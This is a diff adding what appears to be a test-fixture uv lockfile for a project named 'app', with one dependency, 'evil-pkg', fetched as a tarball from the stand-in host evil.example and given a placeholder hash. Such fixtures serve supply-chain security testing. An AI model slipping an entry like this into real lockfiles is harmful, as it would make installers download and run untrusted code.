@@ -1,0 +1,20 @@
+version = 1
+revision = 3
+requires-python = ">=3.11"
+
+[[package]]
+name = "app"
+version = "0.1.0"
+source = { virtual = "." }
+dependencies = [
+    { name = "evil-pkg" },
+]
+
+[package.metadata]
+requires-dist = [{ name = "evil-pkg", url = "https://evil.example/evil-pkg-1.0.0.tar.gz" }]
+
+[[package]]
+name = "evil-pkg"
+version = "1.0.0"
+source.url = "https://evil.example/evil-pkg-1.0.0.tar.gz"
+sdist = { hash = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" }
